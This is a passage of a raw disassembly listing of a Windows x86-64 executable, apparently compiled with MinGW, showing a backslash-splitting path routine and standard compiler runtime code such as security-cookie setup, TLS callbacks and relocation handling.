  4017ea:	4c 8d 05 0f 38 00 00 	lea    0x380f(%rip),%r8        # 0x405000
  4017f1:	ba 00 01 00 00       	mov    $0x100,%edx
  4017f6:	48 8d 74 24 20       	lea    0x20(%rsp),%rsi
  4017fb:	49 89 c9             	mov    %rcx,%r9
  4017fe:	48 89 f1             	mov    %rsi,%rcx
  401801:	e8 4a fd ff ff       	call   0x401550
  401806:	48 89 f2             	mov    %rsi,%rdx
  401809:	8b 0a                	mov    (%rdx),%ecx
  40180b:	48 83 c2 04          	add    $0x4,%rdx
  40180f:	8d 81 ff fe fe fe    	lea    -0x1010101(%rcx),%eax
  401815:	f7 d1                	not    %ecx
  401817:	21 c8                	and    %ecx,%eax
  401819:	25 80 80 80 80       	and    $0x80808080,%eax
  40181e:	74 e9                	je     0x401809
  401820:	89 c1                	mov    %eax,%ecx
  401822:	c1 e9 10             	shr    $0x10,%ecx
  401825:	a9 80 80 00 00       	test   $0x8080,%eax
  40182a:	0f 44 c1             	cmove  %ecx,%eax
  40182d:	48 8d 4a 02          	lea    0x2(%rdx),%rcx
  401831:	89 c7                	mov    %eax,%edi
  401833:	48 0f 44 d1          	cmove  %rcx,%rdx
  401837:	40 00 c7             	add    %al,%dil
  40183a:	48 83 da 03          	sbb    $0x3,%rdx
  40183e:	48 29 f2             	sub    %rsi,%rdx
  401841:	48 83 ea 01          	sub    $0x1,%rdx
  401845:	80 7c 14 20 5c       	cmpb   $0x5c,0x20(%rsp,%rdx,1)
  40184a:	74 64                	je     0x4018b0
  40184c:	0f b6 44 24 21       	movzbl 0x21(%rsp),%eax
  401851:	84 c0                	test   %al,%al
  401853:	74 40                	je     0x401895
  401855:	48 8d 5e 01          	lea    0x1(%rsi),%rbx
  401859:	48 8d 3d e4 37 00 00 	lea    0x37e4(%rip),%rdi        # 0x405044
  401860:	eb 0b                	jmp    0x40186d
  401862:	48 83 c3 01          	add    $0x1,%rbx
  401866:	0f b6 03             	movzbl (%rbx),%eax
  401869:	84 c0                	test   %al,%al
  40186b:	74 28                	je     0x401895
  40186d:	3c 5c                	cmp    $0x5c,%al
  40186f:	75 f1                	jne    0x401862
  401871:	c6 03 00             	movb   $0x0,(%rbx)
  401874:	48 89 f1             	mov    %rsi,%rcx
  401877:	48 83 c3 01          	add    $0x1,%rbx
  40187b:	e8 e8 15 00 00       	call   0x402e68
  401880:	48 89 f9             	mov    %rdi,%rcx
  401883:	89 c2                	mov    %eax,%edx
  401885:	e8 6e 15 00 00       	call   0x402df8
  40188a:	c6 43 ff 5c          	movb   $0x5c,-0x1(%rbx)
  40188e:	0f b6 03             	movzbl (%rbx),%eax
  401891:	84 c0                	test   %al,%al
  401893:	75 d8                	jne    0x40186d
  401895:	48 89 f1             	mov    %rsi,%rcx
  401898:	e8 cb 15 00 00       	call   0x402e68
  40189d:	90                   	nop
  40189e:	48 81 c4 20 01 00 00 	add    $0x120,%rsp
  4018a5:	5b                   	pop    %rbx
  4018a6:	5e                   	pop    %rsi
  4018a7:	5f                   	pop    %rdi
  4018a8:	c3                   	ret
  4018a9:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
  4018b0:	c6 44 14 20 00       	movb   $0x0,0x20(%rsp,%rdx,1)
  4018b5:	eb 95                	jmp    0x40184c
  4018b7:	90                   	nop
  4018b8:	90                   	nop
  4018b9:	90                   	nop
  4018ba:	90                   	nop
  4018bb:	90                   	nop
  4018bc:	90                   	nop
  4018bd:	90                   	nop
  4018be:	90                   	nop
  4018bf:	90                   	nop
  4018c0:	ff 25 ee 7b 00 00    	jmp    *0x7bee(%rip)        # 0x4094b4
  4018c6:	90                   	nop
  4018c7:	90                   	nop
  4018c8:	ff 25 de 7b 00 00    	jmp    *0x7bde(%rip)        # 0x4094ac
  4018ce:	90                   	nop
  4018cf:	90                   	nop
  4018d0:	ff 25 ce 7b 00 00    	jmp    *0x7bce(%rip)        # 0x4094a4
  4018d6:	90                   	nop
  4018d7:	90                   	nop
  4018d8:	ff 25 be 7b 00 00    	jmp    *0x7bbe(%rip)        # 0x40949c
  4018de:	90                   	nop
  4018df:	90                   	nop
  4018e0:	48 83 ec 28          	sub    $0x28,%rsp
  4018e4:	48 8b 05 25 27 00 00 	mov    0x2725(%rip),%rax        # 0x404010
  4018eb:	48 8b 00             	mov    (%rax),%rax
  4018ee:	48 85 c0             	test   %rax,%rax
  4018f1:	74 1d                	je     0x401910
  4018f3:	ff d0                	call   *%rax
  4018f5:	48 8b 05 14 27 00 00 	mov    0x2714(%rip),%rax        # 0x404010
  4018fc:	48 8d 50 08          	lea    0x8(%rax),%rdx
  401900:	48 8b 40 08          	mov    0x8(%rax),%rax
  401904:	48 89 15 05 27 00 00 	mov    %rdx,0x2705(%rip)        # 0x404010
  40190b:	48 85 c0             	test   %rax,%rax
  40190e:	75 e3                	jne    0x4018f3
  401910:	48 83 c4 28          	add    $0x28,%rsp
  401914:	c3                   	ret
  401915:	90                   	nop
  401916:	66 2e 0f 1f 84 00 00 	cs nopw 0x0(%rax,%rax,1)
  40191d:	00 00 00 
  401920:	56                   	push   %rsi
  401921:	53                   	push   %rbx
  401922:	48 83 ec 28          	sub    $0x28,%rsp
  401926:	48 8b 0d 13 3a 00 00 	mov    0x3a13(%rip),%rcx        # 0x405340
  40192d:	48 8b 11             	mov    (%rcx),%rdx
  401930:	83 fa ff             	cmp    $0xffffffff,%edx
  401933:	89 d0                	mov    %edx,%eax
  401935:	74 39                	je     0x401970
  401937:	85 c0                	test   %eax,%eax
  401939:	74 20                	je     0x40195b
  40193b:	89 c2                	mov    %eax,%edx
  40193d:	83 e8 01             	sub    $0x1,%eax
  401940:	48 8d 1c d1          	lea    (%rcx,%rdx,8),%rbx
  401944:	48 29 c2             	sub    %rax,%rdx
  401947:	48 8d 74 d1 f8       	lea    -0x8(%rcx,%rdx,8),%rsi
  40194c:	0f 1f 40 00          	nopl   0x0(%rax)
  401950:	ff 13                	call   *(%rbx)
  401952:	48 83 eb 08          	sub    $0x8,%rbx
  401956:	48 39 f3             	cmp    %rsi,%rbx
  401959:	75 f5                	jne    0x401950
  40195b:	48 8d 0d 7e ff ff ff 	lea    -0x82(%rip),%rcx        # 0x4018e0
  401962:	48 83 c4 28          	add    $0x28,%rsp
  401966:	5b                   	pop    %rbx
  401967:	5e                   	pop    %rsi
  401968:	e9 a3 fb ff ff       	jmp    0x401510
  40196d:	0f 1f 00             	nopl   (%rax)
  401970:	31 c0                	xor    %eax,%eax
  401972:	eb 02                	jmp    0x401976
  401974:	89 d0                	mov    %edx,%eax
  401976:	44 8d 40 01          	lea    0x1(%rax),%r8d
  40197a:	4a 83 3c c1 00       	cmpq   $0x0,(%rcx,%r8,8)
  40197f:	4c 89 c2             	mov    %r8,%rdx
  401982:	75 f0                	jne    0x401974
  401984:	eb b1                	jmp    0x401937
  401986:	66 2e 0f 1f 84 00 00 	cs nopw 0x0(%rax,%rax,1)
  40198d:	00 00 00 
  401990:	8b 05 9a 66 00 00    	mov    0x669a(%rip),%eax        # 0x408030
  401996:	85 c0                	test   %eax,%eax
  401998:	74 06                	je     0x4019a0
  40199a:	c3                   	ret
  40199b:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
  4019a0:	c7 05 86 66 00 00 01 	movl   $0x1,0x6686(%rip)        # 0x408030
  4019a7:	00 00 00 
  4019aa:	e9 71 ff ff ff       	jmp    0x401920
  4019af:	90                   	nop
  4019b0:	48 ff 25 e5 79 00 00 	rex.W jmp *0x79e5(%rip)        # 0x40939c
  4019b7:	90                   	nop
  4019b8:	90                   	nop
  4019b9:	90                   	nop
  4019ba:	90                   	nop
  4019bb:	90                   	nop
  4019bc:	90                   	nop
  4019bd:	90                   	nop
  4019be:	90                   	nop
  4019bf:	90                   	nop
  4019c0:	31 c0                	xor    %eax,%eax
  4019c2:	c3                   	ret
  4019c3:	90                   	nop
  4019c4:	90                   	nop
  4019c5:	90                   	nop
  4019c6:	90                   	nop
  4019c7:	90                   	nop
  4019c8:	90                   	nop
  4019c9:	90                   	nop
  4019ca:	90                   	nop
  4019cb:	90                   	nop
  4019cc:	90                   	nop
  4019cd:	90                   	nop
  4019ce:	90                   	nop
  4019cf:	90                   	nop
  4019d0:	41 54                	push   %r12
  4019d2:	55                   	push   %rbp
  4019d3:	57                   	push   %rdi
  4019d4:	56                   	push   %rsi
  4019d5:	53                   	push   %rbx
  4019d6:	48 83 ec 30          	sub    $0x30,%rsp
  4019da:	48 8b 1d cf 26 00 00 	mov    0x26cf(%rip),%rbx        # 0x4040b0
  4019e1:	48 b8 32 a2 df 2d 99 	movabs $0x2b992ddfa232,%rax
  4019e8:	2b 00 00 
  4019eb:	48 39 c3             	cmp    %rax,%rbx
  4019ee:	48 c7 44 24 20 00 00 	movq   $0x0,0x20(%rsp)
  4019f5:	00 00 
  4019f7:	74 17                	je     0x401a10
  4019f9:	48 f7 d3             	not    %rbx
  4019fc:	48 89 1d bd 26 00 00 	mov    %rbx,0x26bd(%rip)        # 0x4040c0
  401a03:	48 83 c4 30          	add    $0x30,%rsp
  401a07:	5b                   	pop    %rbx
  401a08:	5e                   	pop    %rsi
  401a09:	5f                   	pop    %rdi
  401a0a:	5d                   	pop    %rbp
  401a0b:	41 5c                	pop    %r12
  401a0d:	c3                   	ret
  401a0e:	66 90                	xchg   %ax,%ax
  401a10:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
  401a15:	ff 15 d1 78 00 00    	call   *0x78d1(%rip)        # 0x4092ec
  401a1b:	48 8b 74 24 20       	mov    0x20(%rsp),%rsi
  401a20:	ff 15 a6 78 00 00    	call   *0x78a6(%rip)        # 0x4092cc
  401a26:	41 89 c4             	mov    %eax,%r12d
  401a29:	ff 15 a5 78 00 00    	call   *0x78a5(%rip)        # 0x4092d4
  401a2f:	89 c5                	mov    %eax,%ebp
  401a31:	ff 15 bd 78 00 00    	call   *0x78bd(%rip)        # 0x4092f4
  401a37:	48 8d 4c 24 28       	lea    0x28(%rsp),%rcx
  401a3c:	89 c7                	mov    %eax,%edi
  401a3e:	ff 15 c8 78 00 00    	call   *0x78c8(%rip)        # 0x40930c
  401a44:	48 33 74 24 28       	xor    0x28(%rsp),%rsi
  401a49:	44 89 e0             	mov    %r12d,%eax
  401a4c:	48 ba ff ff ff ff ff 	movabs $0xffffffffffff,%rdx
  401a53:	ff 00 00 
  401a56:	48 31 f0             	xor    %rsi,%rax
  401a59:	89 ee                	mov    %ebp,%esi
  401a5b:	48 31 c6             	xor    %rax,%rsi
  401a5e:	89 f8                	mov    %edi,%eax
  401a60:	48 31 f0             	xor    %rsi,%rax
  401a63:	48 21 d0             	and    %rdx,%rax
  401a66:	48 39 d8             	cmp    %rbx,%rax
  401a69:	74 25                	je     0x401a90
  401a6b:	48 89 c2             	mov    %rax,%rdx
  401a6e:	48 f7 d2             	not    %rdx
  401a71:	48 89 05 38 26 00 00 	mov    %rax,0x2638(%rip)        # 0x4040b0
  401a78:	48 89 15 41 26 00 00 	mov    %rdx,0x2641(%rip)        # 0x4040c0
  401a7f:	48 83 c4 30          	add    $0x30,%rsp
  401a83:	5b                   	pop    %rbx
  401a84:	5e                   	pop    %rsi
  401a85:	5f                   	pop    %rdi
  401a86:	5d                   	pop    %rbp
  401a87:	41 5c                	pop    %r12
  401a89:	c3                   	ret
  401a8a:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
  401a90:	48 ba cc 5d 20 d2 66 	movabs $0xffffd466d2205dcc,%rdx
  401a97:	d4 ff ff 
  401a9a:	48 b8 33 a2 df 2d 99 	movabs $0x2b992ddfa233,%rax
  401aa1:	2b 00 00 
  401aa4:	eb cb                	jmp    0x401a71
  401aa6:	66 2e 0f 1f 84 00 00 	cs nopw 0x0(%rax,%rax,1)
  401aad:	00 00 00 
  401ab0:	55                   	push   %rbp
  401ab1:	56                   	push   %rsi
  401ab2:	53                   	push   %rbx
  401ab3:	48 89 e5             	mov    %rsp,%rbp
  401ab6:	48 83 ec 70          	sub    $0x70,%rsp
  401aba:	48 89 ce             	mov    %rcx,%rsi
  401abd:	48 8d 0d 9c 65 00 00 	lea    0x659c(%rip),%rcx        # 0x408060
  401ac4:	ff 15 52 78 00 00    	call   *0x7852(%rip)        # 0x40931c
  401aca:	48 8b 1d 87 66 00 00 	mov    0x6687(%rip),%rbx        # 0x408158
  401ad1:	48 8d 55 d8          	lea    -0x28(%rbp),%rdx
  401ad5:	45 31 c0             	xor    %r8d,%r8d
  401ad8:	48 89 d9             	mov    %rbx,%rcx
  401adb:	ff 15 43 78 00 00    	call   *0x7843(%rip)        # 0x409324
  401ae1:	48 85 c0             	test   %rax,%rax
  401ae4:	0f 84 a3 00 00 00    	je     0x401b8d
  401aea:	48 8d 55 e0          	lea    -0x20(%rbp),%rdx
  401aee:	49 89 c1             	mov    %rax,%r9
  401af1:	49 89 d8             	mov    %rbx,%r8
  401af4:	48 c7 44 24 38 00 00 	movq   $0x0,0x38(%rsp)
  401afb:	00 00 
  401afd:	48 8d 0d 5c 65 00 00 	lea    0x655c(%rip),%rcx        # 0x408060
  401b04:	48 89 54 24 30       	mov    %rdx,0x30(%rsp)
  401b09:	48 8d 55 e8          	lea    -0x18(%rbp),%rdx
  401b0d:	48 89 4c 24 20       	mov    %rcx,0x20(%rsp)
  401b12:	31 c9                	xor    %ecx,%ecx
  401b14:	48 89 54 24 28       	mov    %rdx,0x28(%rsp)
  401b19:	48 8b 55 d8          	mov    -0x28(%rbp),%rdx
  401b1d:	ff 15 09 78 00 00    	call   *0x7809(%rip)        # 0x40932c
  401b23:	48 8b 05 2e 66 00 00 	mov    0x662e(%rip),%rax        # 0x408158
  401b2a:	31 c9                	xor    %ecx,%ecx
  401b2c:	48 89 35 ad 65 00 00 	mov    %rsi,0x65ad(%rip)        # 0x4080e0
  401b33:	48 89 05 16 6a 00 00 	mov    %rax,0x6a16(%rip)        # 0x408550
  401b3a:	48 b8 09 04 00 c0 01 	movabs $0x1c0000409,%rax
  401b41:	00 00 00 
  401b44:	48 89 05 f5 69 00 00 	mov    %rax,0x69f5(%rip)        # 0x408540
  401b4b:	48 8b 05 5e 25 00 00 	mov    0x255e(%rip),%rax        # 0x4040b0
  401b52:	48 89 45 f0          	mov    %rax,-0x10(%rbp)
  401b56:	48 8b 05 63 25 00 00 	mov    0x2563(%rip),%rax        # 0x4040c0
  401b5d:	48 89 45 f8          	mov    %rax,-0x8(%rbp)
  401b61:	ff 15 cd 77 00 00    	call   *0x77cd(%rip)        # 0x409334
  401b67:	48 8d 0d e2 34 00 00 	lea    0x34e2(%rip),%rcx        # 0x405050
  401b6e:	ff 15 e0 77 00 00    	call   *0x77e0(%rip)        # 0x409354
  401b74:	ff 15 4a 77 00 00    	call   *0x774a(%rip)        # 0x4092c4
  401b7a:	ba 09 04 00 c0       	mov    $0xc0000409,%edx
  401b7f:	48 89 c1             	mov    %rax,%rcx
  401b82:	ff 15 bc 77 00 00    	call   *0x77bc(%rip)        # 0x409344
  401b88:	e8 c3 12 00 00       	call   0x402e50
  401b8d:	48 8b 45 18          	mov    0x18(%rbp),%rax
  401b91:	48 89 05 c0 65 00 00 	mov    %rax,0x65c0(%rip)        # 0x408158
  401b98:	48 8d 45 08          	lea    0x8(%rbp),%rax
  401b9c:	48 89 05 55 65 00 00 	mov    %rax,0x6555(%rip)        # 0x4080f8
  401ba3:	e9 7b ff ff ff       	jmp    0x401b23
  401ba8:	90                   	nop
  401ba9:	90                   	nop
  401baa:	90                   	nop
  401bab:	90                   	nop
  401bac:	90                   	nop
  401bad:	90                   	nop
  401bae:	90                   	nop
  401baf:	90                   	nop
  401bb0:	48 83 ec 28          	sub    $0x28,%rsp
  401bb4:	83 fa 03             	cmp    $0x3,%edx
  401bb7:	74 17                	je     0x401bd0
  401bb9:	85 d2                	test   %edx,%edx
  401bbb:	74 13                	je     0x401bd0
  401bbd:	b8 01 00 00 00       	mov    $0x1,%eax
  401bc2:	48 83 c4 28          	add    $0x28,%rsp
  401bc6:	c3                   	ret
  401bc7:	66 0f 1f 84 00 00 00 	nopw   0x0(%rax,%rax,1)
  401bce:	00 00 
  401bd0:	e8 cb 0c 00 00       	call   0x4028a0
  401bd5:	b8 01 00 00 00       	mov    $0x1,%eax
  401bda:	48 83 c4 28          	add    $0x28,%rsp
  401bde:	c3                   	ret
  401bdf:	90                   	nop
  401be0:	56                   	push   %rsi
  401be1:	53                   	push   %rbx
  401be2:	48 83 ec 28          	sub    $0x28,%rsp
  401be6:	48 8b 05 33 37 00 00 	mov    0x3733(%rip),%rax        # 0x405320
  401bed:	83 38 02             	cmpl   $0x2,(%rax)
  401bf0:	74 06                	je     0x401bf8
  401bf2:	c7 00 02 00 00 00    	movl   $0x2,(%rax)
  401bf8:	83 fa 02             	cmp    $0x2,%edx
  401bfb:	74 13                	je     0x401c10
  401bfd:	83 fa 01             	cmp    $0x1,%edx
  401c00:	74 40                	je     0x401c42
  401c02:	b8 01 00 00 00       	mov    $0x1,%eax
  401c07:	48 83 c4 28          	add    $0x28,%rsp
  401c0b:	5b                   	pop    %rbx
  401c0c:	5e                   	pop    %rsi
  401c0d:	c3                   	ret
  401c0e:	66 90                	xchg   %ax,%ax
  401c10:	48 8d 1d 49 84 00 00 	lea    0x8449(%rip),%rbx        # 0x40a060
  401c17:	48 8d 35 42 84 00 00 	lea    0x8442(%rip),%rsi        # 0x40a060
  401c1e:	48 39 de             	cmp    %rbx,%rsi
  401c21:	74 df                	je     0x401c02
  401c23:	48 8b 03             	mov    (%rbx),%rax
  401c26:	48 85 c0             	test   %rax,%rax
  401c29:	74 02                	je     0x401c2d
  401c2b:	ff d0                	call   *%rax
  401c2d:	48 83 c3 08          	add    $0x8,%rbx
  401c31:	48 39 de             	cmp    %rbx,%rsi
  401c34:	75 ed                	jne    0x401c23
  401c36:	b8 01 00 00 00       	mov    $0x1,%eax
  401c3b:	48 83 c4 28          	add    $0x28,%rsp
  401c3f:	5b                   	pop    %rbx
  401c40:	5e                   	pop    %rsi
  401c41:	c3                   	ret
  401c42:	e8 59 0c 00 00       	call   0x4028a0
  401c47:	b8 01 00 00 00       	mov    $0x1,%eax
  401c4c:	48 83 c4 28          	add    $0x28,%rsp
  401c50:	5b                   	pop    %rbx
  401c51:	5e                   	pop    %rsi
  401c52:	c3                   	ret
  401c53:	0f 1f 00             	nopl   (%rax)
  401c56:	66 2e 0f 1f 84 00 00 	cs nopw 0x0(%rax,%rax,1)
  401c5d:	00 00 00 
  401c60:	31 c0                	xor    %eax,%eax
  401c62:	c3                   	ret
  401c63:	90                   	nop
  401c64:	90                   	nop
  401c65:	90                   	nop
  401c66:	90                   	nop
  401c67:	90                   	nop
  401c68:	90                   	nop
  401c69:	90                   	nop
  401c6a:	90                   	nop
  401c6b:	90                   	nop
  401c6c:	90                   	nop
  401c6d:	90                   	nop
  401c6e:	90                   	nop
  401c6f:	90                   	nop
  401c70:	48 83 ec 58          	sub    $0x58,%rsp
  401c74:	48 8b 05 85 69 00 00 	mov    0x6985(%rip),%rax        # 0x408600
  401c7b:	48 85 c0             	test   %rax,%rax
  401c7e:	74 2c                	je     0x401cac
  401c80:	f2 0f 10 84 24 80 00 	movsd  0x80(%rsp),%xmm0
  401c87:	00 00 
  401c89:	89 4c 24 20          	mov    %ecx,0x20(%rsp)
  401c8d:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
  401c92:	48 89 54 24 28       	mov    %rdx,0x28(%rsp)
  401c97:	f2 0f 11 54 24 30    	movsd  %xmm2,0x30(%rsp)
  401c9d:	f2 0f 11 5c 24 38    	movsd  %xmm3,0x38(%rsp)
  401ca3:	f2 0f 11 44 24 40    	movsd  %xmm0,0x40(%rsp)
  401ca9:	ff d0                	call   *%rax
  401cab:	90                   	nop
  401cac:	48 83 c4 58          	add    $0x58,%rsp
  401cb0:	c3                   	ret
  401cb1:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
  401cb6:	66 2e 0f 1f 84 00 00 	cs nopw 0x0(%rax,%rax,1)
  401cbd:	00 00 00 
  401cc0:	48 89 0d 39 69 00 00 	mov    %rcx,0x6939(%rip)        # 0x408600
  401cc7:	e9 bc 11 00 00       	jmp    0x402e88
  401ccc:	0f 1f 40 00          	nopl   0x0(%rax)
  401cd0:	56                   	push   %rsi
  401cd1:	53                   	push   %rbx
  401cd2:	48 83 ec 78          	sub    $0x78,%rsp
  401cd6:	0f 29 74 24 40       	movaps %xmm6,0x40(%rsp)
  401cdb:	0f 29 7c 24 50       	movaps %xmm7,0x50(%rsp)
  401ce0:	44 0f 29 44 24 60    	movaps %xmm8,0x60(%rsp)
  401ce6:	83 39 06             	cmpl   $0x6,(%rcx)
  401ce9:	0f 87 d1 00 00 00    	ja     0x401dc0
  401cef:	8b 01                	mov    (%rcx),%eax
  401cf1:	48 8d 15 ec 34 00 00 	lea    0x34ec(%rip),%rdx        # 0x4051e4
  401cf8:	48 63 04 82          	movslq (%rdx,%rax,4),%rax
  401cfc:	48 01 d0             	add    %rdx,%rax
  401cff:	ff e0                	jmp    *%rax
  401d01:	48 8d 1d b8 33 00 00 	lea    0x33b8(%rip),%rbx        # 0x4050c0
  401d08:	48 8b 71 08          	mov    0x8(%rcx),%rsi
  401d0c:	f2 44 0f 10 41 20    	movsd  0x20(%rcx),%xmm8
  401d12:	f2 0f 10 79 18       	movsd  0x18(%rcx),%xmm7
  401d17:	f2 0f 10 71 10       	movsd  0x10(%rcx),%xmm6
  401d1c:	b9 02 00 00 00       	mov    $0x2,%ecx
  401d21:	e8 8a 11 00 00       	call   0x402eb0
  401d26:	f2 44 0f 11 44 24 30 	movsd  %xmm8,0x30(%rsp)
  401d2d:	49 89 f1             	mov    %rsi,%r9
  401d30:	49 89 d8             	mov    %rbx,%r8
  401d33:	f2 0f 11 7c 24 28    	movsd  %xmm7,0x28(%rsp)
  401d39:	48 8d 15 78 34 00 00 	lea    0x3478(%rip),%rdx        # 0x4051b8
  401d40:	48 89 c1             	mov    %rax,%rcx
  401d43:	f2 0f 11 74 24 20    	movsd  %xmm6,0x20(%rsp)
  401d49:	e8 da 10 00 00       	call   0x402e28
  401d4e:	90                   	nop
  401d4f:	0f 28 74 24 40       	movaps 0x40(%rsp),%xmm6
  401d54:	31 c0                	xor    %eax,%eax
  401d56:	0f 28 7c 24 50       	movaps 0x50(%rsp),%xmm7
  401d5b:	44 0f 28 44 24 60    	movaps 0x60(%rsp),%xmm8
  401d61:	48 83 c4 78          	add    $0x78,%rsp
  401d65:	5b                   	pop    %rbx
  401d66:	5e                   	pop    %rsi
  401d67:	c3                   	ret
  401d68:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
  401d6f:	00 
  401d70:	48 8d 1d 68 33 00 00 	lea    0x3368(%rip),%rbx        # 0x4050df
  401d77:	eb 8f                	jmp    0x401d08
  401d79:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
  401d80:	48 8d 1d 79 33 00 00 	lea    0x3379(%rip),%rbx        # 0x405100
  401d87:	e9 7c ff ff ff       	jmp    0x401d08
  401d8c:	0f 1f 40 00          	nopl   0x0(%rax)
  401d90:	48 8d 1d d9 33 00 00 	lea    0x33d9(%rip),%rbx        # 0x405170
  401d97:	e9 6c ff ff ff       	jmp    0x401d08
  401d9c:	0f 1f 40 00          	nopl   0x0(%rax)
  401da0:	48 8d 1d a1 33 00 00 	lea    0x33a1(%rip),%rbx        # 0x405148
  401da7:	e9 5c ff ff ff       	jmp    0x401d08
  401dac:	0f 1f 40 00          	nopl   0x0(%rax)
  401db0:	48 8d 1d 69 33 00 00 	lea    0x3369(%rip),%rbx        # 0x405120
  401db7:	e9 4c ff ff ff       	jmp    0x401d08
  401dbc:	0f 1f 40 00          	nopl   0x0(%rax)
  401dc0:	48 8d 1d df 33 00 00 	lea    0x33df(%rip),%rbx        # 0x4051a6
  401dc7:	e9 3c ff ff ff       	jmp    0x401d08
  401dcc:	90                   	nop
  401dcd:	90                   	nop
  401dce:	90                   	nop
  401dcf:	90                   	nop
  401dd0:	db e3                	fninit
  401dd2:	c3                   	ret
  401dd3:	90                   	nop
  401dd4:	90                   	nop
  401dd5:	90                   	nop
  401dd6:	90                   	nop
  401dd7:	90                   	nop
  401dd8:	90                   	nop
  401dd9:	90                   	nop
  401dda:	90                   	nop
  401ddb:	90                   	nop
  401ddc:	90                   	nop
  401ddd:	90                   	nop
  401dde:	90                   	nop
  401ddf:	90                   	nop
  401de0:	48 89 c8             	mov    %rcx,%rax
  401de3:	c3                   	ret
  401de4:	66 90                	xchg   %ax,%ax
  401de6:	66 2e 0f 1f 84 00 00 	cs nopw 0x0(%rax,%rax,1)
  401ded:	00 00 00 
  401df0:	48 89 c8             	mov    %rcx,%rax
  401df3:	c3                   	ret
  401df4:	90                   	nop
  401df5:	90                   	nop
  401df6:	90                   	nop
  401df7:	90                   	nop
  401df8:	90                   	nop
  401df9:	90                   	nop
  401dfa:	90                   	nop
  401dfb:	90                   	nop
  401dfc:	90                   	nop
  401dfd:	90                   	nop
  401dfe:	90                   	nop
  401dff:	90                   	nop
  401e00:	41 54                	push   %r12
  401e02:	55                   	push   %rbp
  401e03:	57                   	push   %rdi
  401e04:	56                   	push   %rsi
  401e05:	53                   	push   %rbx
  401e06:	48 83 ec 50          	sub    $0x50,%rsp
  401e0a:	48 63 35 13 68 00 00 	movslq 0x6813(%rip),%rsi        # 0x408624
  401e11:	85 f6                	test   %esi,%esi
  401e13:	48 89 cb             	mov    %rcx,%rbx
  401e16:	48 89 d5             	mov    %rdx,%rbp
  401e19:	4c 89 c7             	mov    %r8,%rdi
  401e1c:	0f 8e 66 01 00 00    	jle    0x401f88
  401e22:	48 8b 05 ff 67 00 00 	mov    0x67ff(%rip),%rax        # 0x408628
  401e29:	31 c9                	xor    %ecx,%ecx
  401e2b:	48 83 c0 18          	add    $0x18,%rax
  401e2f:	90                   	nop
  401e30:	48 8b 10             	mov    (%rax),%rdx
  401e33:	48 39 d3             	cmp    %rdx,%rbx
  401e36:	72 14                	jb     0x401e4c
  401e38:	4c 8b 40 08          	mov    0x8(%rax),%r8
  401e3c:	45 8b 40 08          	mov    0x8(%r8),%r8d
  401e40:	4c 01 c2             	add    %r8,%rdx
  401e43:	48 39 d3             	cmp    %rdx,%rbx
  401e46:	0f 82 89 00 00 00    	jb     0x401ed5
  401e4c:	83 c1 01             	add    $0x1,%ecx
  401e4f:	48 83 c0 28          	add    $0x28,%rax
  401e53:	39 f1                	cmp    %esi,%ecx
  401e55:	75 d9                	jne    0x401e30
  401e57:	48 89 d9             	mov    %rbx,%rcx
  401e5a:	e8 41 0c 00 00       	call   0x402aa0
  401e5f:	48 85 c0             	test   %rax,%rax
  401e62:	49 89 c4             	mov    %rax,%r12
  401e65:	0f 84 52 01 00 00    	je     0x401fbd
  401e6b:	48 8b 05 b6 67 00 00 	mov    0x67b6(%rip),%rax        # 0x408628
  401e72:	48 8d 34 b6          	lea    (%rsi,%rsi,4),%rsi
  401e76:	48 c1 e6 03          	shl    $0x3,%rsi
  401e7a:	48 01 f0             	add    %rsi,%rax
  401e7d:	4c 89 60 20          	mov    %r12,0x20(%rax)
  401e81:	c7 00 00 00 00 00    	movl   $0x0,(%rax)
  401e87:	e8 44 0d 00 00       	call   0x402bd0
  401e8c:	41 8b 4c 24 0c       	mov    0xc(%r12),%ecx
  401e91:	48 8d 54 24 20       	lea    0x20(%rsp),%rdx
  401e96:	41 b8 30 00 00 00    	mov    $0x30,%r8d
  401e9c:	48 01 c1             	add    %rax,%rcx
  401e9f:	48 8b 05 82 67 00 00 	mov    0x6782(%rip),%rax        # 0x408628
  401ea6:	48 89 4c 30 18       	mov    %rcx,0x18(%rax,%rsi,1)
  401eab:	ff 15 b3 74 00 00    	call   *0x74b3(%rip)        # 0x409364
  401eb1:	48 85 c0             	test   %rax,%rax
  401eb4:	0f 84 e6 00 00 00    	je     0x401fa0
  401eba:	8b 44 24 44          	mov    0x44(%rsp),%eax
  401ebe:	8d 50 fc             	lea    -0x4(%rax),%edx
  401ec1:	83 e2 fb             	and    $0xfffffffb,%edx
  401ec4:	74 08                	je     0x401ece
  401ec6:	83 e8 40             	sub    $0x40,%eax
  401ec9:	83 e0 bf             	and    $0xffffffbf,%eax
  401ecc:	75 62                	jne    0x401f30
  401ece:	83 05 4f 67 00 00 01 	addl   $0x1,0x674f(%rip)        # 0x408624
  401ed5:	83 ff 08             	cmp    $0x8,%edi
  401ed8:	73 29                	jae    0x401f03
  401eda:	40 f6 c7 04          	test   $0x4,%dil
  401ede:	0f 85 90 00 00 00    	jne    0x401f74
  401ee4:	85 ff                	test   %edi,%edi
  401ee6:	74 10                	je     0x401ef8
  401ee8:	0f b6 45 00          	movzbl 0x0(%rbp),%eax
  401eec:	40 f6 c7 02          	test   $0x2,%dil
  401ef0:	88 03                	mov    %al,(%rbx)
  401ef2:	0f 85 97 00 00 00    	jne    0x401f8f
  401ef8:	48 83 c4 50          	add    $0x50,%rsp
  401efc:	5b                   	pop    %rbx
  401efd:	5e                   	pop    %rsi
  401efe:	5f                   	pop    %rdi
  401eff:	5d                   	pop    %rbp
  401f00:	41 5c                	pop    %r12
  401f02:	c3                   	ret
  401f03:	89 f8                	mov    %edi,%eax
  401f05:	83 ef 01             	sub    $0x1,%edi
  401f08:	48 8b 54 05 f8       	mov    -0x8(%rbp,%rax,1),%rdx
  401f0d:	83 ff 08             	cmp    $0x8,%edi
  401f10:	48 89 54 03 f8       	mov    %rdx,-0x8(%rbx,%rax,1)
  401f15:	72 e1                	jb     0x401ef8
  401f17:	83 e7 f8             	and    $0xfffffff8,%edi
  401f1a:	31 c0                	xor    %eax,%eax
  401f1c:	89 c2                	mov    %eax,%edx
